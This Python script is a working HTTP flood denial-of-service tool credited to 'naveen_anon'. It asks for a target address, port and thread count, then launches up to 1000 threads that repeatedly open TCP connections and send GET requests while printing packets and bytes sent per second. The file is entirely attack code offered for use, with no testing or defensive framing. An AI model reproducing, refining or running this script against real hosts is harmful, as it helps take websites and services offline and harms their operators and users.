import socket
import threading
import time
import random
import sys
import colorama
from colorama import Fore, Style

colorama.init()

class bcolors:
    WARNING = Fore.YELLOW
    OKBLUE = Fore.LIGHTBLUE_EX
    RESET = Style.RESET_ALL
    FAIL = Fore.RED

REQUESTS_SENT = 0  # Initialize REQUESTS_SENT
BYTES_SEND = 0    # Initialize BYTES_SEND
ts = time.time()
event = threading.Event()

def attack(target, port, method):
    global REQUESTS_SENT, BYTES_SEND
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        packet = ("GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % target).encode('ascii')
        sock.sendall(packet) # Use sendall to ensure complete sending
        REQUESTS_SENT += 1
        BYTES_SEND += len(packet)
        sock.close()
    except Exception as e:
        # print(f"Attack Error: {e}") # Uncomment for debugging
        pass

def flood(target, port, method, threads):
    global REQUESTS_SENT, BYTES_SEND
    while not event.is_set():
        try:
            attack(target, port, method)
            time.sleep(0.0001)  # Reduced rate limiting
        except:
            pass

def ToolsConsole():
    global REQUESTS_SENT, BYTES_SEND # Declare globals inside the function
    print(f"""{bcolors.OKBLUE}
   _____ _        _            _____       _
  / ____| |      | |          / ____|     | |
 | (___ | |_ __ _| |_ ___   | |  __  __ _| |_ ___  _ __
  \___ \| __/ _` | __/ _ \  | | |_ |/ _` | __/ _ \| '__|
  ____) | || (_| | ||  __/  | |__| | (_| | || (_) | |
 |_____/ \__\__,_|\__\___|   \_____|\__,_|\__\___/|_|
{bcolors.RESET}
    """)

    print(f"{bcolors.WARNING}Creator:{bcolors.OKBLUE} naveen_anon {bcolors.RESET}")

    target = input(f"{bcolors.WARNING}Enter target IP/URL: {bcolors.OKBLUE}")
    try:
        port = int(input(f"{bcolors.WARNING}Enter target port (e.g., 80): {bcolors.OKBLUE}") or 80)
    except ValueError:
        print(f"{bcolors.FAIL}Invalid port number. Using default port 80.{bcolors.RESET}")
        port = 80
    method = "GET"  # Fixed method
    try:
        threads = int(input(f"{bcolors.WARNING}Enter number of threads (max 1000): {bcolors.OKBLUE}") or 100)
        threads = min(threads, 1000)  # Limit threads to 1000
    except ValueError:
        print(f"{bcolors.FAIL}Invalid thread number. Using default 100 threads.{bcolors.RESET}")
        threads = 100

    # Try resolving to IP only if it's not already an IP address
    try:
        socket.inet_aton(target)  # Check if target is already a valid IP
        ip = target  # It's already an IP address, so use it directly
    except socket.error:
        try:
            ip = socket.gethostbyname(target)  # Resolve to IP address
        except socket.gaierror:
            print(f"{bcolors.FAIL}Invalid target or unable to resolve.{bcolors.RESET}")
            return

    print(f"{bcolors.WARNING}Starting attack with {threads} threads on {ip}:{port}...{bcolors.RESET}")

    ts = time.time()  # Capture start time here
    REQUESTS_SENT = 0 # Reset counters before starting threads
    BYTES_SEND = 0 # Reset counters before starting threads

    for _ in range(threads):
        thread = threading.Thread(target=flood, args=(ip, port, method, threads)) # Pass IP to flood
        thread.daemon = True
        thread.start()

    try:
        while True:
            time.sleep(1) # Check every second

            elapsed_time = time.time() - ts
            pps = REQUESTS_SENT
            bps = BYTES_SEND

            print(f'{bcolors.WARNING}Target:{bcolors.OKBLUE} {ip}:{port},{bcolors.WARNING} Method:{bcolors.OKBLUE} {method}{bcolors.WARNING} PPS:{bcolors.OKBLUE} {pps},{bcolors.WARNING} BPS:{bcolors.OKBLUE} {bps}{bcolors.RESET}') # Show IP and port in output

            REQUESTS_SENT = 0  # Reset counters
            BYTES_SEND = 0


    except KeyboardInterrupt:
        event.set()
        print(f"{bcolors.WARNING}\nAttack stopped.{bcolors.RESET}")
        sys.exit(0)


if __name__ == "__main__":
    ToolsConsole()
